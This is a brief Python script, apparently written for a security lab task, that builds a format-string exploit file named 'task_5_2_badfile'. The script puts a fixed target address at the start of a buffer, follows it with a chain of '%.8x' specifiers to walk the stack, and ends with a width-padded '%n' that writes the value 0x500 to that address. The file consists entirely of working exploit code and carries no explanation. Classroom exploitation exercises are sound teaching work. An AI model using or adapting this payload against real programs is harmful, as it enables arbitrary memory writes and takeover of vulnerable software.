#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

TARGET_NEW_VALUE = 0x500

target_address = 0x080e5068
content[0:4] = (target_address).to_bytes(4, byteorder='little')

s = "%.8x" * 30
s += "%." + str(TARGET_NEW_VALUE - 240 - 4) + "x" + "%n"

print(s)

fmt = (s).encode('latin-1')
content[4:4 + len(fmt)] = fmt

file = open("task_5_2_badfile", "wb")
file.write(content)
file.close()
